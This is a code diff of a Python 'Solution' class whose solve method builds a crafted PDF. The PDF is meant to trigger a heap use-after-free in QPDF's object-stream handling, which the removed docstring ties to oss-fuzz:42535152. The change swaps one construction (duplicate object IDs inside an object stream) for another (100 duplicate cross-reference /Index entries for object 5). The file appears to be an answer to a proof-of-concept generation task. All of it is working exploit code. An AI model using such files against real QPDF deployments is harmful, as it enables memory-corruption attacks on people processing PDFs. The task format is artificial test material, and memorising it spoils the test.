@@ -2,84 +2,83 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in QPDF.
-        Targeting oss-fuzz:42535152 in QPDFWriter::preserveObjectStreams.
-        The PoC creates an Object Stream containing multiple definitions for the same object ID,
-        confusing the object cache during processing.
-        """
+        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
         
-        def pack_row(t, f1, f2):
-            # Pack XRef entry: Type (1 byte), Field1 (4 bytes), Field2 (1 byte)
-            return struct.pack('>BIB', t, f1, f2)
-
-        content = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
-        offsets = {}
+        # 1 0 obj: Catalog
+        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
         
-        # Object 1: Catalog
-        offsets[1] = len(content)
-        content += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+        # 2 0 obj: Pages
+        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
         
-        # Object 2: Pages
-        offsets[2] = len(content)
-        content += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
+        # 3 0 obj: Page
+        # Reference ID 5 in Annots to ensure it is processed
+        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Annots [5 0 R] >>\nendobj\n"
         
-        # Object 3: Page
-        offsets[3] = len(content)
-        content += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
+        # 4 0 obj: Object Stream containing object 5
+        # The stream data maps: "5 0" (obj 5 at offset 0). The object data is "(test)".
+        # "5 0 " is 4 bytes. So /First should be 4.
+        stm_data = b"5 0 (test)"
+        o4 = b"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 >>\nstream\n" + stm_data + b"\nendstream\nendobj\n"
         
-        # Object 4: Object Stream (The malicious component)
-        # We define object ID 5 multiple times within this stream's mapping.
-        # This stresses the logic in QPDF::getCompressibleObjSet which iterates over the stream contents.
-        offsets[4] = len(content)
-        num_dups = 100
-        obj_inner = b"[(Payload)]"
-        len_inner = len(obj_inner)
+        body = header + o1 + o2 + o3 + o4
         
-        # Construct mapping: "5 0 5 11 5 22 ..."
-        # ID 5 repeats 100 times.
-        mapping_parts = []
-        stream_payload = b""
-        for i in range(num_dups):
-            mapping_parts.append(f"5 {i * len_inner}")
-            stream_payload += obj_inner
+        # Calculate offsets
+        off1 = len(header)
+        off2 = off1 + len(o1)
+        off3 = off2 + len(o2)
+        off4 = off3 + len(o3)
+        
+        # Prepare XRef Stream data (ID 6)
+        # We will create multiple entries for ID 5 to trigger the vulnerability
+        # in QPDFWriter::preserveObjectStreams / QPDF::getCompressibleObjSet
+        dup_count = 100
+        
+        # /W [1 4 2] -> Type (1 byte), Field2 (4 bytes), Field3 (2 bytes)
+        def create_entry(type_, f2, f3):
+            return struct.pack('>B', type_) + struct.pack('>I', f2) + struct.pack('>H', f3)
+        
+        entries = []
+        # ID 0: Free
+        entries.append(create_entry(0, 0, 65535))
+        # ID 1: In use
+        entries.append(create_entry(1, off1, 0))
+        # ID 2: In use
+        entries.append(create_entry(1, off2, 0))
+        # ID 3: In use
+        entries.append(create_entry(1, off3, 0))
+        # ID 4: In use (The ObjStm)
+        entries.append(create_entry(1, off4, 0))
+        
+        # ID 5: Compressed in Stm 4 at index 0
+        # Duplicate this entry many times
+        for _ in range(dup_count):
+            entries.append(create_entry(2, 4, 0))
             
-        mapping_str = " ".join(mapping_parts) + " "
-        mapping_bytes = mapping_str.encode('ascii')
-        full_stream = mapping_bytes + stream_payload
+        xref_bytes = b"".join(entries)
         
-        # /N = number of objects in stream
-        content += f"4 0 obj\n<< /Type /ObjStm /N {num_dups} /First {len(mapping_bytes)} /Length {len(full_stream)} >>\nstream\n".encode('ascii')
-        content += full_stream
-        content += b"\nendstream\nendobj\n"
+        # Build /Index array: [0 5, 5 1, 5 1, ...]
+        # 0 5 -> defines 0, 1, 2, 3, 4
+        # 5 1 -> defines 5
+        # 5 1 -> defines 5 (again)
+        index_arr = [0, 5]
+        for _ in range(dup_count):
+            index_arr.extend([5, 1])
+            
+        index_str = " ".join(map(str, index_arr)).encode('ascii')
         
-        # Object 6: XRef Stream (To properly reference the ObjStm)
-        offsets[6] = len(content)
+        # 6 0 obj: XRef Stream
+        # Size is 6 (IDs 0-5)
+        xobj_dict = (
+            b"<< /Type /XRef /Size 6 /Root 1 0 R /W [ 1 4 2 ] /Index [ " + 
+            index_str + 
+            b" ] /Length " + str(len(xref_bytes)).encode('ascii') + b" >>"
+        )
         
-        # Build XRef entries (indices 0 to 6)
-        xref_data = b""
-        # 0: Free
-        xref_data += pack_row(0, 0, 0)
-        # 1: Catalog
-        xref_data += pack_row(1, offsets[1], 0)
-        # 2: Pages
-        xref_data += pack_row(1, offsets[2], 0)
-        # 3: Page
-        xref_data += pack_row(1, offsets[3], 0)
-        # 4: ObjStm
-        xref_data += pack_row(1, offsets[4], 0)
-        # 5: Compressed object (located in Stream 4, index 0)
-        xref_data += pack_row(2, 4, 0)
-        # 6: XRef Stream (Self)
-        xref_data += pack_row(1, offsets[6], 0)
+        o6 = b"6 0 obj\n" + xobj_dict + b"\nstream\n" + xref_bytes + b"\nendstream\nendobj\n"
         
-        content += f"6 0 obj\n<< /Type /XRef /Size 7 /W [1 4 1] /Root 1 0 R /Length {len(xref_data)} >>\nstream\n".encode('ascii')
-        content += xref_data
-        content += b"\nendstream\nendobj\n"
+        # Final PDF assembly
+        off6 = len(body)
+        pdf = body + o6
+        trailer = b"startxref\n%d\n%%%%EOF" % off6
         
-        # Trailer
-        content += b"startxref\n"
-        content += f"{offsets[6]}\n".encode('ascii')
-        content += b"%%EOF\n"
-        
-        return content
+        return pdf + trailer
